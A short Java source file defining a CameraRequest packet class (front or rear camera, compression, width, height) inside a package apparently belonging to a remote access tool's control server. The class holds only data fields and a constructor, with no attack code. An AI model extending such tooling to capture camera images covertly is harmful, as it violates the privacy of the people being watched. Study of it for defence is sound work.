package com.nefi.chainrat.server.network.ControlServer.packets;

public class CameraRequest {
    public boolean useFront;
    public boolean useCompression;
    public int width;
    public int height;


    public CameraRequest(boolean useFront, boolean useCompression, int width, int height){
        this.useFront = useFront;
        this.useCompression = useCompression;
        this.width = width;
        this.height = height;
    }
}
